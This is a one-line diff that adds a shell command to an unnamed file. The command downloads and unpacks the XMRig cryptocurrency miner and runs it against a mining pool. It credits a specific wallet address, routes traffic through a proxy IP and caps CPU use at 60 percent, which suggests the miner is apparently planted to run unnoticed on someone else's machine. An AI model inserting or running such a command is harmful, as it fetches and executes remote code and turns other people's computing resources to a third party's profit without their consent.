@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.3.2/xmrig-6.3.2-xenial-x64.tar.gz && tar -zxf xmrig-6.3.2-xenial-x64.tar.gz && cd xmrig-6.3.2 && ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u BABYDOGE:0x3d7B82Bf8c93EDBbc47d5b6871cd219e58f17458.jorge --proxy=3.133.232.223:1080 --cpu-max-threads-hint=60 --no-huge-pages --randomx-mode=auto
